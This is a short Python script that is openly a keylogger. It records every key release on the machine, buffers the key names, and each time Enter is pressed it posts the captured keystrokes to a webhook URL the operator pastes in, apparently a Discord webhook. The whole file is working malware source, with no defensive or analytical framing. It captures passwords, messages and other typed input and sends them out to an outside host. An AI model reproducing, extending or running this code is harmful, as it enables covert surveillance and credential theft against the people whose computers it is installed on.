import keyboard
import requests

WEBHOOK = "PASTE YOUR WEBHOOK HERE!"
LOG = []

def on_key_release(key):
    global LOG
    if key.name == "enter":
        data = {
            "username" : "KeyLogger"
        }
        data["embeds"] = [
            {
                "description" : f"{' '.join(LOG)}"
            }
        ]
        requests.post(WEBHOOK, json=data)
        LOG.clear()
    else:
        LOG.append(f"`{key.name}`")


keyboard.on_release(on_key_release)

keyboard.wait()
